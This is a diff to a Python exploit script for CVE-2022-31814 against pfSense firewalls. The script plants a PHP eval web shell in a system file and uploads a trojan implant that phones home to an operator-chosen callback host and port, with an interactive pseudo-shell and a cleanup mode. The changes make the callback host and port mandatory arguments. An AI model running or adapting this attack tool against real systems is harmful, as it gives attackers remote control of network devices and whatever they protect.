@@ -5,6 +5,7 @@ import base64
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 import argparse
+import sys
 # hardcoded for now. We have to avoid bad chars later. maybe a config file would be nice?
 shell_code = "<?php eval($_POST[1337]);?>"
 shell_fullpath = "/usr/local/www/system_advanced_control.php"
@@ -142,20 +143,27 @@ def delete_webshell(base_url, shell_webpath, shell_param, shell_fullpath):
     execute_command(base_url, shell_webpath, shell_param, shell_command) 
 
 def main():
-    parser = argparse.ArgumentParser()
+    parser = argparse.ArgumentParser(description="CVE-2022-31814: Who will do something about this senseless violence?")
     parser.add_argument('--target', help="Target Host, eg: https://pfsense.local", required=True)
     parser.add_argument('--mode', help="Mode: probe, touch, exploit or cleanup.", choices=["touch", "probe", "exploit", "cleanup"], required=True)
     parser.add_argument('--interact', help="In exploit mode, spawns a pseudo-shell with file transfer capabilities.", default=False)
     parser.add_argument('--trojan', help="The implant to upload and execute", default="utils/trojan")
-    parser.add_argument('--cbhost', help="Callback host for implant", default="127.0.0.1")
-    parser.add_argument('--cbport', help="Callback port for implant", default="4444")
+    parser.add_argument('--cbhost', help="Callback host for implant")
+    parser.add_argument('--cbport', help="Callback port for implant")
     args = parser.parse_args()
     if args.mode == "touch":
         touch(base_url=args.target, target_path=target_path)
     elif args.mode == "probe":
         probe(base_url=args.target, target_path=target_path)
     elif args.mode == "exploit":
-        exploit(base_url=args.target, connectback_host=args.cbhost, connectback_port=args.cbport, trojan=args.trojan, interact=args.interact)
+        if not args.cbhost:
+            sys.exit("(!) You forgot to set the --cbhost")
+        if not args.cbport:
+            sys.exit("(!) You forgot to set the --cbport")
+        else:
+            print(f"(+) Using trojan: {args.trojan}")
+            print(f"(+) Trojan is phoning home to: {args.cbhost}:{args.cbport}")
+            exploit(base_url=args.target, connectback_host=args.cbhost, connectback_port=args.cbport, trojan=args.trojan, interact=args.interact)
     elif args.mode == "cleanup":
         cleanup(base_url=args.target, shell_webpath=shell_webpath, shell_param=shell_param, cleanup_script=cleanup_script)
 
